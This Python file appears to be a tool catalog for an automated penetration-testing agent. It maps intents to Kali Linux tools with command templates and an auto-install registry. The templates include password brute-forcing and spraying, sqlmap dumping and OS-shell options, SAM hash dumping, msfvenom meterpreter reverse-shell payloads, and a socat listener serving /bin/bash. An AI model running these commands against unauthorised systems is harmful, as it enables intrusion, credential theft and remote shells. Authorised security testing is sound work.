"""
Comprehensive Kali Linux Tool Catalog for NLP-Driven Tool Selection
Organized by category with metadata, command templates, and options
"""

KALI_TOOL_CATALOG = {
    # ═══════════════════════════════════════════════════════════
    # CATEGORY: Web Application Analysis
    # ═══════════════════════════════════════════════════════════
    "web_enumeration": {
        "keywords": ["web", "website", "http", "https", "directory", "files", "paths", "folders", "endpoints"],
        "tools": {
            "gobuster": {
                "description": "Fast directory/file/DNS/vhost bruteforcing tool",
                "use_cases": ["directory enumeration", "file discovery", "vhost discovery", "dns bruteforce", "hidden paths"],
                "command_templates": {
                    "dir": "gobuster dir -u {url} -w {wordlist} -t {threads} -x {extensions} --no-error",
                    "dns": "gobuster dns -d {domain} -w {wordlist} -t {threads}",
                    "vhost": "gobuster vhost -u {url} -w {wordlist} -t {threads}"
                },
                "default_options": {
                    "wordlist": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                    "threads": 50,
                    "extensions": "php,html,txt,js,zip,bak"
                },
                "timeout": 300,
                "category": "web_enumeration"
            },
            "dirb": {
                "description": "Web content scanner",
                "use_cases": ["directory enumeration", "recursive scanning", "authenticated scanning"],
                "command_templates": {
                    "default": "dirb {url} {wordlist} -S -r",
                    "auth": "dirb {url} {wordlist} -u {username}:{password}"
                },
                "default_options": {
                    "wordlist": "/usr/share/dirb/wordlists/common.txt"
                },
                "timeout": 180,
                "category": "web_enumeration"
            },
            "ffuf": {
                "description": "Fast web fuzzer written in Go",
                "use_cases": ["directory fuzzing", "parameter fuzzing", "vhost fuzzing", "header fuzzing"],
                "command_templates": {
                    "dir": "ffuf -u {url}/FUZZ -w {wordlist} -mc {match_codes} -t {threads} -c",
                    "param": "ffuf -u '{url}?FUZZ=test' -w {wordlist} -mc 200 -t {threads}",
                    "vhost": "ffuf -u {url} -H 'Host: FUZZ.{domain}' -w {wordlist} -mc 200"
                },
                "default_options": {
                    "wordlist": "/usr/share/wordlists/dirb/common.txt",
                    "match_codes": "200,301,302,403",
                    "threads": 40
                },
                "timeout": 300,
                "category": "web_enumeration"
            },
            "nikto": {
                "description": "Web server vulnerability scanner",
                "use_cases": ["vulnerability scanning", "misconfiguration detection", "outdated software detection", "dangerous files"],
                "command_templates": {
                    "default": "nikto -h {url} -maxtime {maxtime} -Format txt",
                    "ssl": "nikto -h {url} -ssl -maxtime {maxtime}"
                },
                "default_options": {
                    "maxtime": "10m"
                },
                "timeout": 600,
                "category": "web_enumeration"
            },
            "wpscan": {
                "description": "WordPress security scanner",
                "use_cases": ["wordpress enumeration", "plugin scanning", "theme scanning", "user enumeration", "vulnerability detection"],
                "command_templates": {
                    "full": "wpscan --url {url} --enumerate u,p,t --random-user-agent --api-token {api_token}",
                    "basic": "wpscan --url {url} --enumerate u --random-user-agent",
                    "aggressive": "wpscan --url {url} --enumerate ap,at,cb,dbe --plugins-detection aggressive"
                },
                "default_options": {},
                "timeout": 600,
                "category": "web_enumeration"
            },
            "whatweb": {
                "description": "Web technology fingerprinting tool",
                "use_cases": ["technology identification", "cms detection", "framework detection", "version detection"],
                "command_templates": {
                    "default": "whatweb {url} -v",
                    "aggressive": "whatweb {url} -v --aggression 3"
                },
                "timeout": 60,
                "category": "web_enumeration"
            },
            "sqlmap": {
                "description": "Automatic SQL injection and database takeover tool",
                "use_cases": ["sql injection detection", "database extraction", "file read/write", "os shell"],
                "command_templates": {
                    "detect": "sqlmap -u '{url}' --batch --random-agent --level={level} --risk={risk}",
                    "dump": "sqlmap -u '{url}' --batch --dump -D {database} -T {table}",
                    "os-shell": "sqlmap -u '{url}' --batch --os-shell",
                    "forms": "sqlmap -u '{url}' --forms --batch --crawl=2"
                },
                "default_options": {
                    "level": 2,
                    "risk": 2
                },
                "timeout": 600,
                "category": "web_exploitation"
            },
            "commix": {
                "description": "Command injection exploitation tool",
                "use_cases": ["command injection detection", "os command execution", "file upload", "reverse shell"],
                "command_templates": {
                    "default": "commix --url='{url}' --batch",
                    "data": "commix --url='{url}' --data='{post_data}' --batch"
                },
                "timeout": 300,
                "category": "web_exploitation"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: Network Scanning & Enumeration
    # ═══════════════════════════════════════════════════════════
    "network_scanning": {
        "keywords": ["scan", "port", "network", "host", "service", "discovery", "enumerate", "recon"],
        "tools": {
            "nmap": {
                "description": "Network exploration and security auditing tool",
                "use_cases": ["port scanning", "service detection", "os fingerprinting", "vulnerability scanning", "network mapping"],
                "command_templates": {
                    "quick": "nmap -sV -sC -T4 --top-ports 1000 {target}",
                    "full": "nmap -p- -sV -sC -T4 {target}",
                    "vuln": "nmap --script vuln -p {ports} {target}",
                    "udp": "nmap -sU --top-ports 20 {target}",
                    "stealth": "nmap -sS -T2 -p {ports} {target}",
                    "ping_sweep": "nmap -sn {target}"
                },
                "default_options": {
                    "timing": "T4",
                    "top_ports": 1000
                },
                "timeout": 600,
                "category": "network_scanning"
            },
            "masscan": {
                "description": "TCP port scanner, faster than nmap",
                "use_cases": ["fast port scanning", "large network scanning", "internet-scale scanning"],
                "command_templates": {
                    "default": "masscan -p{ports} {target} --rate={rate}",
                    "fast": "masscan -p1-65535 {target} --rate=10000"
                },
                "default_options": {
                    "ports": "1-65535",
                    "rate": 1000
                },
                "timeout": 300,
                "category": "network_scanning"
            },
            "rustscan": {
                "description": "Modern fast port scanner with nmap integration",
                "use_cases": ["ultra-fast port scanning", "nmap integration", "adaptive scanning"],
                "command_templates": {
                    "default": "rustscan -a {target} -- -sV -sC",
                    "fast": "rustscan -a {target} --ulimit 5000"
                },
                "timeout": 180,
                "category": "network_scanning"
            },
            "arp-scan": {
                "description": "ARP scanning and fingerprinting tool",
                "use_cases": ["local network discovery", "mac address enumeration", "arp spoofing detection"],
                "command_templates": {
                    "local": "arp-scan --localnet",
                    "subnet": "arp-scan {subnet}",
                    "interface": "arp-scan --interface={interface} --localnet"
                },
                "timeout": 60,
                "category": "network_scanning"
            },
            "netdiscover": {
                "description": "Active/passive ARP reconnaissance tool",
                "use_cases": ["network discovery", "passive monitoring", "arp scanning"],
                "command_templates": {
                    "active": "netdiscover -r {subnet} -P",
                    "passive": "netdiscover -p -i {interface}"
                },
                "timeout": 120,
                "category": "network_scanning"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: Password Attacks
    # ═══════════════════════════════════════════════════════════
    "password_attacks": {
        "keywords": ["bruteforce", "brute force", "password", "crack", "spray", "credentials", "login", "auth"],
        "tools": {
            "hydra": {
                "description": "Network logon cracker supporting many protocols",
                "use_cases": ["ssh bruteforce", "ftp bruteforce", "http bruteforce", "smb bruteforce", "rdp bruteforce"],
                "command_templates": {
                    "ssh": "hydra -L {userlist} -P {passlist} ssh://{target}:{port} -t {threads} -V",
                    "ftp": "hydra -L {userlist} -P {passlist} ftp://{target} -t {threads}",
                    "http-post": "hydra -L {userlist} -P {passlist} {target} http-post-form '{path}:{params}:{fail_string}' -t {threads}",
                    "smb": "hydra -L {userlist} -P {passlist} smb://{target} -t {threads}"
                },
                "default_options": {
                    "userlist": "/usr/share/wordlists/metasploit/unix_users.txt",
                    "passlist": "/usr/share/wordlists/fasttrack.txt",
                    "threads": 4,
                    "port": 22
                },
                "timeout": 1800,
                "category": "password_attacks"
            },
            "medusa": {
                "description": "Speedy, parallel, modular login brute-forcer",
                "use_cases": ["multi-protocol bruteforce", "parallel attacks", "module-based attacks"],
                "command_templates": {
                    "default": "medusa -h {target} -u {username} -P {passlist} -M {service} -t {threads} -f",
                    "userlist": "medusa -h {target} -U {userlist} -P {passlist} -M {service} -t {threads}"
                },
                "default_options": {
                    "threads": 4
                },
                "timeout": 1800,
                "category": "password_attacks"
            },
            "john": {
                "description": "John the Ripper password cracker",
                "use_cases": ["hash cracking", "password recovery", "format detection", "rule-based attacks"],
                "command_templates": {
                    "crack": "john --wordlist={wordlist} {hashfile}",
                    "show": "john --show {hashfile}",
                    "format": "john --format={format} --wordlist={wordlist} {hashfile}",
                    "rules": "john --wordlist={wordlist} --rules {hashfile}"
                },
                "default_options": {
                    "wordlist": "/usr/share/wordlists/rockyou.txt"
                },
                "timeout": 3600,
                "category": "password_attacks"
            },
            "hashcat": {
                "description": "Advanced password recovery tool",
                "use_cases": ["gpu hash cracking", "advanced attacks", "mask attacks", "combinator attacks"],
                "command_templates": {
                    "crack": "hashcat -m {mode} {hashfile} {wordlist}",
                    "mask": "hashcat -m {mode} {hashfile} -a 3 {mask}",
                    "combinator": "hashcat -m {mode} {hashfile} -a 1 {wordlist1} {wordlist2}"
                },
                "default_options": {
                    "wordlist": "/usr/share/wordlists/rockyou.txt"
                },
                "timeout": 3600,
                "category": "password_attacks"
            },
            "crackmapexec": {
                "description": "Swiss army knife for pentesting Windows/AD networks",
                "use_cases": ["smb enumeration", "password spraying", "hash dumping", "command execution"],
                "command_templates": {
                    "smb_spray": "crackmapexec smb {target} -u {userlist} -p {password} --continue-on-success",
                    "smb_enum": "crackmapexec smb {target} -u {username} -p {password} --shares",
                    "smb_exec": "crackmapexec smb {target} -u {username} -p {password} -x '{command}'",
                    "sam_dump": "crackmapexec smb {target} -u {username} -p {password} --sam"
                },
                "timeout": 600,
                "category": "password_attacks"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: SMB/Windows Enumeration
    # ═══════════════════════════════════════════════════════════
    "smb_enumeration": {
        "keywords": ["smb", "samba", "shares", "windows", "enum4linux", "445"],
        "tools": {
            "enum4linux": {
                "description": "Tool for enumerating information from Windows and Samba systems",
                "use_cases": ["smb shares", "user enumeration", "group enumeration", "policy information"],
                "command_templates": {
                    "full": "enum4linux -a {target}",
                    "users": "enum4linux -U {target}",
                    "shares": "enum4linux -S {target}",
                    "policies": "enum4linux -P {target}"
                },
                "timeout": 180,
                "category": "smb_enumeration"
            },
            "smbclient": {
                "description": "FTP-like client to access SMB/CIFS resources",
                "use_cases": ["smb access", "file download", "file upload", "anonymous login"],
                "command_templates": {
                    "list": "smbclient -L //{target} -N",
                    "connect": "smbclient //{target}/{share} -U {username}%{password}",
                    "anon": "smbclient //{target}/{share} -N"
                },
                "interactive": True,
                "timeout": 120,
                "category": "smb_enumeration"
            },
            "smbmap": {
                "description": "SMB enumeration tool",
                "use_cases": ["share enumeration", "permission checking", "file discovery", "recursive listing"],
                "command_templates": {
                    "anonymous": "smbmap -H {target}",
                    "auth": "smbmap -H {target} -u {username} -p {password}",
                    "recursive": "smbmap -H {target} -u {username} -p {password} -R",
                    "download": "smbmap -H {target} -u {username} -p {password} --download '{file}'"
                },
                "timeout": 180,
                "category": "smb_enumeration"
            },
            "rpcclient": {
                "description": "Tool for executing client side MS-RPC functions",
                "use_cases": ["rpc enumeration", "user enumeration", "domain info", "null session"],
                "command_templates": {
                    "connect": "rpcclient -U '' -N {target}",
                    "auth": "rpcclient -U {username}%{password} {target}"
                },
                "interactive": True,
                "timeout": 120,
                "category": "smb_enumeration"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: DNS Enumeration
    # ═══════════════════════════════════════════════════════════
    "dns_enumeration": {
        "keywords": ["dns", "domain", "nameserver", "subdomain", "zone transfer", "dig", "nslookup"],
        "tools": {
            "dig": {
                "description": "DNS lookup utility",
                "use_cases": ["dns records", "zone transfers", "dns queries", "reverse lookups"],
                "command_templates": {
                    "all": "dig {domain} ANY +noall +answer",
                    "mx": "dig {domain} MX +short",
                    "ns": "dig {domain} NS +short",
                    "txt": "dig {domain} TXT +short",
                    "axfr": "dig {domain} AXFR @{nameserver}"
                },
                "timeout": 60,
                "category": "dns_enumeration"
            },
            "nslookup": {
                "description": "Query Internet name servers interactively",
                "use_cases": ["dns lookup", "reverse lookup", "mx records"],
                "command_templates": {
                    "default": "nslookup {domain}",
                    "reverse": "nslookup {ip}",
                    "mx": "nslookup -type=mx {domain}"
                },
                "timeout": 30,
                "category": "dns_enumeration"
            },
            "host": {
                "description": "DNS lookup utility",
                "use_cases": ["simple dns lookup", "reverse dns", "all records"],
                "command_templates": {
                    "default": "host {domain}",
                    "all": "host -a {domain}",
                    "reverse": "host {ip}"
                },
                "timeout": 30,
                "category": "dns_enumeration"
            },
            "dnsrecon": {
                "description": "DNS enumeration script",
                "use_cases": ["dns enumeration", "zone transfer", "subdomain bruteforce", "google scraping"],
                "command_templates": {
                    "standard": "dnsrecon -d {domain}",
                    "bruteforce": "dnsrecon -d {domain} -D {wordlist} -t brt",
                    "axfr": "dnsrecon -d {domain} -t axfr"
                },
                "default_options": {
                    "wordlist": "/usr/share/wordlists/dnsmap.txt"
                },
                "timeout": 300,
                "category": "dns_enumeration"
            },
            "fierce": {
                "description": "DNS reconnaissance tool",
                "use_cases": ["subdomain discovery", "dns bruteforce", "zone walking"],
                "command_templates": {
                    "default": "fierce --domain {domain}",
                    "dns-servers": "fierce --domain {domain} --dns-servers {nameserver}"
                },
                "timeout": 300,
                "category": "dns_enumeration"
            },
            "dnsenum": {
                "description": "DNS enumeration tool",
                "use_cases": ["dns enumeration", "zone transfer", "google scraping", "reverse lookups"],
                "command_templates": {
                    "default": "dnsenum {domain}",
                    "bruteforce": "dnsenum --enum {domain}"
                },
                "timeout": 300,
                "category": "dns_enumeration"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: OSINT
    # ═══════════════════════════════════════════════════════════
    "osint": {
        "keywords": ["osint", "reconnaissance", "information gathering", "passive", "emails", "usernames", "social"],
        "tools": {
            "theHarvester": {
                "description": "E-mail, subdomain and people names harvester",
                "use_cases": ["email harvesting", "subdomain discovery", "employee names", "ip addresses"],
                "command_templates": {
                    "default": "theHarvester -d {domain} -b {sources} -l {limit}",
                    "targeted": "theHarvester -d {domain} -b google,linkedin,hunter -l 200",
                    "all": "theHarvester -d {domain} -b all -l 500"
                },
                "default_options": {
                    "sources": "google,bing,yahoo,linkedin",
                    "limit": 200
                },
                "timeout": 300,
                "category": "osint"
            },
            "sherlock": {
                "description": "Hunt down social media accounts by username",
                "use_cases": ["social media enumeration", "username tracking", "account discovery"],
                "command_templates": {
                    "default": "sherlock {username} --print-found --timeout 10",
                    "tor": "sherlock {username} --tor --print-found"
                },
                "timeout": 120,
                "category": "osint"
            },
            "holehe": {
                "description": "Check if email is used on different sites",
                "use_cases": ["email enumeration", "service discovery", "account identification"],
                "command_templates": {
                    "default": "holehe {email}",
                    "specific": "holehe {email} --only-used"
                },
                "timeout": 60,
                "category": "osint"
            },
            "sublist3r": {
                "description": "Fast subdomains enumeration tool",
                "use_cases": ["subdomain discovery", "passive recon", "search engine scraping"],
                "command_templates": {
                    "default": "sublist3r -d {domain} -t {threads} -o {outfile}",
                    "bruteforce": "sublist3r -d {domain} -b -t {threads}"
                },
                "default_options": {
                    "threads": 10
                },
                "timeout": 300,
                "category": "osint"
            },
            "amass": {
                "description": "In-depth attack surface mapping and asset discovery",
                "use_cases": ["subdomain enumeration", "network mapping", "asset discovery", "dns enumeration"],
                "command_templates": {
                    "passive": "amass enum -passive -d {domain}",
                    "active": "amass enum -active -d {domain} -brute -w {wordlist}",
                    "intel": "amass intel -d {domain}"
                },
                "timeout": 600,
                "category": "osint"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: Exploitation
    # ═══════════════════════════════════════════════════════════
    "exploitation": {
        "keywords": ["exploit", "metasploit", "msfconsole", "vulnerability", "cve", "poc"],
        "tools": {
            "searchsploit": {
                "description": "Exploit-DB command line search tool",
                "use_cases": ["exploit searching", "cve lookup", "vulnerability research", "poc discovery"],
                "command_templates": {
                    "search": "searchsploit {query}",
                    "exact": "searchsploit -e {query}",
                    "copy": "searchsploit -m {exploit_id}",
                    "json": "searchsploit --json {query}"
                },
                "timeout": 30,
                "category": "exploitation"
            },
            "msfconsole": {
                "description": "Metasploit Framework console interface",
                "use_cases": ["exploit execution", "payload generation", "post-exploitation", "auxiliary modules"],
                "command_templates": {
                    "console": "msfconsole -q",
                    "exploit": "msfconsole -q -x 'use {exploit}; set RHOSTS {target}; set LHOST {lhost}; exploit'",
                    "resource": "msfconsole -q -r {resource_file}"
                },
                "interactive": True,
                "timeout": None,
                "category": "exploitation"
            },
            "msfvenom": {
                "description": "Payload generator and encoder",
                "use_cases": ["payload generation", "encoder", "format conversion", "shellcode generation"],
                "command_templates": {
                    "windows": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
                    "linux": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
                    "php": "msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.php",
                    "list": "msfvenom --list payloads"
                },
                "timeout": 60,
                "category": "exploitation"
            }
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CATEGORY: Network Tools
    # ═══════════════════════════════════════════════════════════
    "network_tools": {
        "keywords": ["netcat", "nc", "listener", "shell", "reverse", "bind", "port forward"],
        "tools": {
            "netcat": {
                "description": "TCP/UDP Swiss army knife",
                "use_cases": ["reverse shells", "bind shells", "port listening", "banner grabbing", "file transfer"],
                "command_templates": {
                    "listener": "nc -lvnp {port}",
                    "connect": "nc {target} {port}",
                    "banner": "nc -v {target} {port}",
                    "transfer": "nc -lvnp {port} > {file}"
                },
                "interactive": True,
                "timeout": None,
                "category": "network_tools"
            },
            "socat": {
                "description": "Advanced networking tool and relay",
                "use_cases": ["port forwarding", "ssl connections", "relay", "encrypted shells"],
                "command_templates": {
                    "forward": "socat TCP-LISTEN:{lport},fork TCP:{target}:{rport}",
                    "ssl_listener": "socat OPENSSL-LISTEN:{port},cert=server.pem,verify=0 EXEC:/bin/bash",
                    "encrypted": "socat TCP-LISTEN:{port},fork OPENSSL:{target}:{rport},verify=0"
                },
                "timeout": None,
                "category": "network_tools"
            },
            "tcpdump": {
                "description": "Packet analyzer for network traffic",
                "use_cases": ["packet capture", "network traffic analysis", "protocol debugging"],
                "command_templates": {
                    "capture": "tcpdump -i {interface} -w {outfile}",
                    "filter": "tcpdump -i {interface} {filter}",
                    "read": "tcpdump -r {file}"
                },
                "timeout": 600,
                "category": "network_tools"
            }
        }
    }
}

# Intent Classification Keywords (for NLP fallback)
INTENT_KEYWORDS = {
    "web_enumeration": ["enumerate", "scan", "directory", "files", "paths", "bruteforce", "fuzz", "wordpress", "cms"],
    "network_scanning": ["scan", "port", "service", "host", "discovery", "enumerate", "ping", "sweep"],
    "password_attacks": ["bruteforce", "brute", "crack", "password", "spray", "login", "auth", "credentials"],
    "smb_enumeration": ["smb", "samba", "shares", "enum4linux", "windows", "cifs"],
    "dns_enumeration": ["dns", "domain", "subdomain", "nameserver", "zone transfer", "dig", "nslookup"],
    "osint": ["osint", "reconnaissance", "passive", "emails", "usernames", "social media", "harvester"],
    "exploitation": ["exploit", "metasploit", "vulnerability", "cve", "poc", "searchsploit"],
    "network_tools": ["netcat", "listener", "shell", "reverse", "bind", "port forward"]
}

# ═══════════════════════════════════════════════════════════
# Tool Install Registry
# Maps binary names to their installation method for auto-install
# when a tool is missing from the Kali Docker container.
# ═══════════════════════════════════════════════════════════
TOOL_INSTALL_REGISTRY = {
    # Format: "binary_name": {"method": "apt"|"pip"|"git", "package": "...", ...}

    # Network scanning
    "nmap": {"method": "apt", "package": "nmap"},
    "masscan": {"method": "apt", "package": "masscan"},
    "rustscan": {"method": "apt", "package": "rustscan"},
    "arp-scan": {"method": "apt", "package": "arp-scan"},
    "netdiscover": {"method": "apt", "package": "netdiscover"},
    "hping3": {"method": "apt", "package": "hping3"},

    # Web tools
    "gobuster": {"method": "apt", "package": "gobuster"},
    "dirb": {"method": "apt", "package": "dirb"},
    "ffuf": {"method": "apt", "package": "ffuf"},
    "nikto": {"method": "apt", "package": "nikto"},
    "wpscan": {"method": "apt", "package": "wpscan"},
    "whatweb": {"method": "apt", "package": "whatweb"},
    "sqlmap": {"method": "apt", "package": "sqlmap"},
    "commix": {"method": "apt", "package": "commix"},
    "wapiti": {"method": "apt", "package": "wapiti"},
    "xsser": {"method": "apt", "package": "xsser"},
    "feroxbuster": {"method": "apt", "package": "feroxbuster"},
    "wafw00f": {"method": "pip", "package": "wafw00f"},

    # OSINT
    "theHarvester": {"method": "apt", "package": "theharvester"},
    "theharvester": {"method": "apt", "package": "theharvester"},
    "amass": {"method": "apt", "package": "amass"},
    "sublist3r": {"method": "apt", "package": "sublist3r"},
    "recon-ng": {"method": "apt", "package": "recon-ng"},
    "fierce": {"method": "apt", "package": "fierce"},
    "sherlock": {"method": "pip", "package": "sherlock-project"},
    "holehe": {"method": "pip", "package": "holehe"},
    "h8mail": {"method": "pip", "package": "h8mail"},
    "socialscan": {"method": "pip", "package": "socialscan"},
    "spiderfoot": {"method": "apt", "package": "spiderfoot"},
    "maltego": {"method": "apt", "package": "maltego"},
    "photon": {"method": "git", "repo": "https://github.com/s0md3v/Photon.git",
               "path": "/opt/photon", "setup": "cd /opt/photon && pip3 install --break-system-packages -r requirements.txt && ln -sf /opt/photon/photon.py /usr/local/bin/photon"},

    # Password attacks
    "hydra": {"method": "apt", "package": "hydra"},
    "medusa": {"method": "apt", "package": "medusa"},
    "john": {"method": "apt", "package": "john"},
    "hashcat": {"method": "apt", "package": "hashcat"},
    "crackmapexec": {"method": "pip", "package": "crackmapexec"},

    # SMB/Windows
    "enum4linux": {"method": "apt", "package": "enum4linux"},
    "smbclient": {"method": "apt", "package": "smbclient"},
    "smbmap": {"method": "apt", "package": "smbmap"},
    "rpcclient": {"method": "apt", "package": "samba-common-bin"},
    "nbtscan": {"method": "apt", "package": "nbtscan"},
    "onesixtyone": {"method": "apt", "package": "onesixtyone"},
    "snmpwalk": {"method": "apt", "package": "snmp"},
    "evil-winrm": {"method": "apt", "package": "evil-winrm"},
    "responder": {"method": "apt", "package": "responder"},
    "impacket-smbserver": {"method": "pip", "package": "impacket"},
    "certipy": {"method": "pip", "package": "certipy-ad"},

    # DNS
    "dig": {"method": "apt", "package": "dnsutils"},
    "nslookup": {"method": "apt", "package": "dnsutils"},
    "host": {"method": "apt", "package": "dnsutils"},
    "dnsrecon": {"method": "apt", "package": "dnsrecon"},
    "dnsenum": {"method": "apt", "package": "dnsenum"},

    # Exploitation
    "searchsploit": {"method": "apt", "package": "exploitdb"},
    "msfconsole": {"method": "apt", "package": "metasploit-framework"},
    "msfvenom": {"method": "apt", "package": "metasploit-framework"},

    # Network tools
    "nc": {"method": "apt", "package": "netcat-openbsd"},
    "ncat": {"method": "apt", "package": "ncat"},
    "socat": {"method": "apt", "package": "socat"},
    "tcpdump": {"method": "apt", "package": "tcpdump"},

    # Misc / forensics / steganography
    "exiftool": {"method": "apt", "package": "exiftool"},
    "binwalk": {"method": "apt", "package": "binwalk"},
    "foremost": {"method": "apt", "package": "foremost"},
    "steghide": {"method": "apt", "package": "steghide"},
    "stegseek": {"method": "apt", "package": "stegseek"},
    "volatility3": {"method": "pip", "package": "volatility3"},
    "pwntools": {"method": "pip", "package": "pwntools"},
    "bloodhound-python": {"method": "pip", "package": "bloodhound"},
    "cewl": {"method": "apt", "package": "cewl"},
    "crunch": {"method": "apt", "package": "crunch"},
    "wordlists": {"method": "apt", "package": "wordlists"},
    "seclists": {"method": "apt", "package": "seclists"},
}
